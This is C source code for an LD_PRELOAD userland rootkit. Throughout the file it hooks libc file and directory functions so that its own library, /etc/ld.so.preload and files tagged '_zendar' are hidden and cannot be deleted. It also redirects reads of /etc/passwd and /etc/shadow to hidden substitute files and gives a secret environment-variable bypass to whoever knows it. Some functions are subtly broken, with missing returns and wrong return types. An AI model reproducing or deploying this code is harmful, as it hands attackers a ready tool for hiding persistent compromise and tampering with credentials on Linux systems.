#define _GNU_SOURCE

//user defined variables [START]

#undef DEBUG
#define ANTI_DEBUG "Secret Sex Loaf of a Single Mom"
#define HIDDEN_STRING "_zendar"
#define LIB_NAME "libsslcore.so"

//user defined variables [END]

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

#include <sys/types.h>
#include <sys/stat.h>

int zendarU(){
	const char *s = getenv("ZENDAR");
	if(s != NULL){
		return 1;
	}
	return 0;
}

int hiddenFile(const char *a){
	if(strstr(a, LIB_NAME) != NULL){
		return 1;
	}
	char cwd[1024];
	if(getcwd(cwd, sizeof(cwd)) != NULL){
		if(strstr(cwd, "/etc") != NULL && strstr(a, "ld.so.preload") != NULL){
			return 1;
		}
	}
	if(strstr(a, "/etc/ld.so.preload") != NULL){
		return 1;
	}
	if(strstr(a, HIDDEN_STRING) != NULL){
		return 1;
	}
	return 0;
}

int access(const char *path, int amode){
	#ifdef DEBUG
		printf("access() hooked.\n");
	#endif
	typeof(access) *old_access = dlsym(RTLD_NEXT, "access");
	if(zendarU()){
		return old_access(path, amode);
	}
	if(hiddenFile(path)){
		return -1;
	}
	return old_access(path, amode);
}

int rmdir(const char *pathname){
	#ifdef DEBUG
		printf("rmdir() hooked.\n");
	#endif
	typeof(rmdir) *old_rmdir = dlsym(RTLD_NEXT, "rmdir");
	if(zendarU()){
		return old_rmdir(pathname);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_rmdir(pathname);
}

int stat(const char *pathname, struct stat *buf){
	#ifdef DEBUG
		printf("stat() hooked.\n");
	#endif
	typeof(stat) *old_stat = dlsym(RTLD_NEXT, "stat");
	if(zendarU()){
		return old_stat(pathname, buf);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_stat(pathname, buf);
}

int stat64(const char *pathname, struct stat64 *buf){
	#ifdef DEBUG
		printf("stat64() hooked.\n");
	#endif
	typeof(stat64) *old_stat64 = dlsym(RTLD_NEXT, "stat64");
	if(zendarU()){
		return old_stat64(pathname, buf);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_stat64(pathname, buf);
}

int __xstat(int ver, const char *path, struct stat *buf){
	#ifdef DEBUG
		printf("__xstat() hooked.\n");
	#endif
	typeof(__xstat) *old_xstat = dlsym(RTLD_NEXT, "__xstat");
	if(zendarU()){
		return old_xstat(ver, path, buf);
	}
	if(hiddenFile(path)){
		return -1;
	}
	return old_xstat(ver, path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf){
	#ifdef DEBUG
		printf("__xstat64() hooked.\n");
	#endif
	typeof(__xstat64) *old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	if(zendarU()){
		return old_xstat64(ver, path, buf);
	}
	if(hiddenFile(path)){
		return -1;
	}
	return old_xstat64(ver, path, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf){
	#ifdef DEBUG
		printf("__lxstat() hooked.\n");
	#endif
	typeof(__lxstat) *old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	if(zendarU()){
		return old_lxstat(ver, file, buf);
	}
	if(hiddenFile(file)){
		return -1;
	}
	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf){
	#ifdef DEBUG
		printf("__lxstat64() hooked.\n");
	#endif
	typeof(__lxstat64) *old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	if(zendarU()){
		return old_lxstat64(ver, file, buf);
	}
	if(hiddenFile(file)){
		return -1;
	}
	return old_lxstat64(ver, file, buf);
}

int lstat(const char *file, struct stat *buf){
	#ifdef DEBUG
		printf("lstat() hooked.\n");
	#endif
	typeof(lstat) *old_lstat = dlsym(RTLD_NEXT, "lstat");
	if(zendarU()){
		return old_lstat(file, buf);
	}
	if(hiddenFile(file)){
		return -1;
	}
	return old_lstat(file, buf);
}

int lstat64(const char *file, struct stat64 *buf){
	#ifdef DEBUG
		printf("lstat64() hooked.\n");
	#endif
	typeof(lstat64) *old_lstat64 = dlsym(RTLD_NEXT, "lstat64");
	if(zendarU()){
		return old_lstat64(file, buf);
	}
	if(hiddenFile(file)){
		return -1;
	}
	return old_lstat64(file, buf);
}

FILE *fopen(const char *path, const char *mode){
	#ifdef DEBUG
		printf("fopen() hooked.\n");
	#endif
	typeof(fopen) *old_fopen = dlsym(RTLD_NEXT, "fopen");
	if(zendarU()){
		return old_fopen(path, mode);
	}
	if(hiddenFile(path)){
		return NULL;
	}
	return old_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode){
	#ifdef DEBUG
		printf("fopen64() hooked.\n");
	#endif
	typeof(fopen64) *old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
	if(zendarU()){
		return old_fopen64(path, mode);
	}
	if(hiddenFile(path)){
		return NULL;
	}
	return old_fopen64(path, mode);
}

DIR *opendir(const char *name){
	#ifdef DEBUG
		printf("opendir() hooked.\n");
	#endif
	typeof(opendir) *old_opendir = dlsym(RTLD_NEXT, "opendir");
	if(zendarU()){
		return old_opendir(name);
	}
	if(strstr(name, ".")){
		char cwd[1024];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			if(hiddenFile(cwd)){
				return -1;
			}
		}
	}
	if(strstr(name, HIDDEN_STRING)){
		char cwd[1024];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			return -1;
		}
	}
	return old_opendir(name);
}

DIR *opendir64(const char *name){
	#ifdef DEBUG
		printf("opendir64() hooked.\n");
	#endif
	typeof(opendir64) *old_opendir64 = dlsym(RTLD_NEXT, "opendir64");
	if(zendarU()){
		return old_opendir64(name);
	}
	if(strstr(name, ".")){
		char cwd[1024];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			if(hiddenFile(cwd)){
				return -1;
			}
		}
	}
	if(strstr(name, HIDDEN_STRING)){
		char cwd[1024];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			return -1;
		}
	}
}

int mkdir(const char *pathname, mode_t mode){
	#ifdef DEBUG
		printf("mkdir() hooked.\n");
	#endif
	typeof(mkdir) *old_mkdir = dlsym(RTLD_NEXT, "mkdir");
	if(zendarU()){
		return old_mkdir(pathname, mode);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_mkdir(pathname, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode){
	#ifdef DEBUG
		printf("openat() hooked.\n");
	#endif
	typeof(openat) *old_openat = dlsym(RTLD_NEXT, "openat");
	if(zendarU()){
		return old_openat(dirfd, pathname, flags, mode);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_openat(dirfd, pathname, flags, mode);
}

int creat(const char *pathname, mode_t mode){
	#ifdef DEBUG
		printf("creat() hooked.\n");
	#endif
	typeof(creat) *old_creat = dlsym(RTLD_NEXT, "creat");
	if(zendarU()){
		return old_creat(pathname, mode);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_creat(pathname, mode);
}

int open(const char *pathname, int flags, mode_t mode){
	#ifdef DEBUG
		printf("open() hooked.\n");
	#endif
	typeof(open) *old_open = dlsym(RTLD_NEXT, "open");
	if(zendarU()){
		return old_open(pathname, flags, mode);
	}
	if(strstr(pathname, "/etc/passwd")){
		return old_open("/etc/.passwd", flags, mode);
	}
	if(strstr(pathname, "/etc/shadow")){
		return old_open("/etc/.shadow", flags, mode);
	}
	if(hiddenFile(pathname)){
		return -1;
	}
	return old_open(pathname, flags, mode);
}

int rename(const char *oldpath, const char *newpath){
	#ifdef DEBUG
		printf("rename() hooked.");
	#endif
	typeof(rename) *old_rename = dlsym(RTLD_NEXT, "rename");
	if(zendarU()){
		return old_rename(oldpath, newpath);
	}
	if(hiddenFile(oldpath) || hiddenFile(newpath)){
		return -1;
	}
}

int link(const char *oldpath, const char *newpath){
	#ifdef DEBUG
		printf("link() hooked.\n");
	#endif
	typeof(link) *old_link = dlsym(RTLD_NEXT, "link");
	if(zendarU()){
		return old_link(oldpath, newpath);
	}
	if(hiddenFile(oldpath) || hiddenFile(newpath)){
		return -1;
	}
	return old_link(oldpath, newpath);
}

int unlink(const char *path){
	#ifdef DEBUG
		printf("unlink() hooked.\n");
	#endif
	typeof(unlink) *old_unlink = dlsym(RTLD_NEXT, "unlink");
	if(zendarU()){
		return old_unlink(path);
	}
	if(hiddenFile(path)){
		return -1;
	}
	return old_unlink(path);
}

int unlinkat(int fd, const char *path, int flag){
	#ifdef DEBUG
		printf("unlinkat() hooked.\n");
	#endif
	typeof(unlinkat) *old_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
	if(zendarU()){
		return old_unlinkat(fd, path, flag);
	}
	if(hiddenFile(path)){
		return -1;
	}
	return old_unlinkat(fd, path, flag);
}
